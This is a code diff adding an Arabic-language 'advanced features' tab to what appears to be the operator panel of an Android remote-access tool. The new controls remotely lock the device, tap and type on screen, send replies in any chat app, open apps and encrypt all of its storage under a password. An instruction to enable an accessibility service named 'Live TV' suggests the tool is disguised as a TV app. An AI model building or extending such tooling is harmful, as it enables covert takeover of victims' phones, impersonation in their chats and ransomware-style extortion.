@@ -58,6 +58,11 @@
                     <span class="icon">🎭</span>
                     <span class="text">تغيير الأيقونة</span>
                 </button>
+
+                <button id="advancedBtn" onclick="switchTab('advanced')" class="action-btn-grid style-advanced">
+                    <span class="icon">⚡</span>
+                    <span class="text">المميزات المتقدمة</span>
+                </button>
             </div>
         </header>
 
@@ -94,6 +99,7 @@
             <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
             <button class="tab" onclick="switchTab('security')">🔐 الأجهزة <span id="pendingBadge" class="count"></span></button>
+            <button class="tab" onclick="switchTab('advanced')">⚡ متقدمة</button>
         </div>
 
         <div class="tab-content">
@@ -212,6 +218,132 @@
                     <div id="devicePermsList" style="margin-top:10px;"></div>
                 </div>
             </div>
+
+            <!-- ═══════════════════════════════════════════════════
+                 ⚡ قسم المميزات المتقدمة (جديد)
+                 ═══════════════════════════════════════════════════ -->
+            <div id="advancedTab" class="tab-pane">
+                <h3>⚡ المميزات المتقدمة</h3>
+                <p style="color:#888;font-size:13px;margin-bottom:20px;text-align:center;">
+                    أدوات متقدمة للتحكم بالجهاز عن بعد (تحتاج صلاحية Accessibility)
+                </p>
+
+                <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:15px;">
+
+                    <!-- 🔒 قفل الجهاز -->
+                    <div style="background:#0a0a0a;border:2px solid #ff4444;border-radius:12px;padding:18px;">
+                        <h4 style="color:#ff4444;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">🔒</span> قفل الجهاز
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:15px;">
+                            يقفل شاشة الجهاز فوراً
+                        </p>
+                        <button onclick="advancedAction('lock_device')" style="width:100%;background:linear-gradient(135deg,#ff4444,#cc0000);color:#fff;border:none;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;box-shadow:0 0 15px rgba(255,68,68,0.4);">
+                            🔒 قفل الآن
+                        </button>
+                    </div>
+
+                    <!-- 🖱️ الضغط التلقائي -->
+                    <div style="background:#0a0a0a;border:2px solid #00ffcc;border-radius:12px;padding:18px;">
+                        <h4 style="color:#00ffcc;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">🖱️</span> الضغط التلقائي
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            اضغط زر بنصه (موجود على شاشة الجهاز)
+                        </p>
+                        <input id="clickText" placeholder="نص الزر (مثلاً: موافق)" style="width:100%;padding:10px;background:#111;border:1px solid #00ffcc;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
+                        <button onclick="autoClickText()" style="width:100%;background:linear-gradient(135deg,#00ffcc,#009977);color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                            🖱️ اضغط الزر
+                        </button>
+                    </div>
+
+                    <!-- 💬 الرد التلقائي -->
+                    <div style="background:#0a0a0a;border:2px solid #25D366;border-radius:12px;padding:18px;">
+                        <h4 style="color:#25D366;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">💬</span> رد تلقائي (أي تطبيق)
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            اكتب رد واحطه في أي محادثة مفتوحة
+                        </p>
+                        <input id="autoReplyText" placeholder="نص الرد" style="width:100%;padding:10px;background:#111;border:1px solid #25D366;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
+                        <button onclick="autoReplyAny()" style="width:100%;background:linear-gradient(135deg,#25D366,#128C7E);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                            💬 أرسل الرد
+                        </button>
+                    </div>
+
+                    <!-- ⌨️ كتابة نص -->
+                    <div style="background:#0a0a0a;border:2px solid #9b59b6;border-radius:12px;padding:18px;">
+                        <h4 style="color:#9b59b6;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">⌨️</span> كتابة نص
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            اكتب نص في الحقل المحدد حالياً
+                        </p>
+                        <input id="typeTextInput" placeholder="النص المراد كتابته" style="width:100%;padding:10px;background:#111;border:1px solid #9b59b6;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
+                        <button onclick="typeText()" style="width:100%;background:linear-gradient(135deg,#9b59b6,#8e44ad);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                            ⌨️ اكتب
+                        </button>
+                    </div>
+
+                    <!-- 🔐 تشفير الملفات -->
+                    <div style="background:#0a0a0a;border:2px solid #FFD700;border-radius:12px;padding:18px;">
+                        <h4 style="color:#FFD700;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">🔐</span> تشفير كل التخزين
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            ⚠️ يشفّر كل الملفات — لا يمكن الفك بدون كلمة المرور
+                        </p>
+                        <input id="encryptionPassword" type="password" placeholder="كلمة المرور (4+ أحرف)" style="width:100%;padding:10px;background:#111;border:1px solid #FFD700;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="encryptFiles()" style="flex:1;background:linear-gradient(135deg,#FFD700,#B8860B);color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                                🔒 تشفير
+                            </button>
+                            <button onclick="decryptFiles()" style="flex:1;background:linear-gradient(135deg,#00cc66,#009944);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                                🔓 فك
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- 🎮 أزرار الجهاز -->
+                    <div style="background:#0a0a0a;border:2px solid #00aaff;border-radius:12px;padding:18px;">
+                        <h4 style="color:#00aaff;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">🎮</span> أزرار الجهاز
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            تحكم بأزرار الجهاز عن بعد
+                        </p>
+                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
+                            <button onclick="advancedAction('go_home')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🏠 Home</button>
+                            <button onclick="advancedAction('go_back')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">⬅️ Back</button>
+                            <button onclick="advancedAction('open_recents')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">📋 Recents</button>
+                            <button onclick="advancedAction('open_notifications')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🔔 إشعارات</button>
+                        </div>
+                    </div>
+
+                    <!-- 🌐 فتح تطبيق -->
+                    <div style="background:#0a0a0a;border:2px solid #ff9800;border-radius:12px;padding:18px;">
+                        <h4 style="color:#ff9800;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">🌐</span> فتح تطبيق
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            افتح تطبيق على الجهاز بالباكج
+                        </p>
+                        <input id="openAppPackage" placeholder="com.whatsapp" style="width:100%;padding:10px;background:#111;border:1px solid #ff9800;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
+                        <button onclick="openApp()" style="width:100%;background:linear-gradient(135deg,#ff9800,#e65100);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                            🌐 افتح التطبيق
+                        </button>
+                    </div>
+
+                </div>
+
+                <!-- ℹ️ معلومات -->
+                <div style="margin-top:20px;padding:15px;background:#1a1400;border:1px solid #FFD700;border-radius:10px;">
+                    <p style="color:#FFD700;font-size:12px;margin:0;">
+                        ⚠️ <b>ملاحظة:</b> هذه المميزات تحتاج <b>Accessibility Service</b> مفعّلة على الجهاز.
+                        إذا لم تظهر نتائج، افتح صفحة الإعدادات على الجهاز وفعّل خدمة "Live TV".
+                    </p>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -281,4 +413,4 @@
     }
     </script>
 </body>
-                                                                                                                                                                                         </html>
+</html>
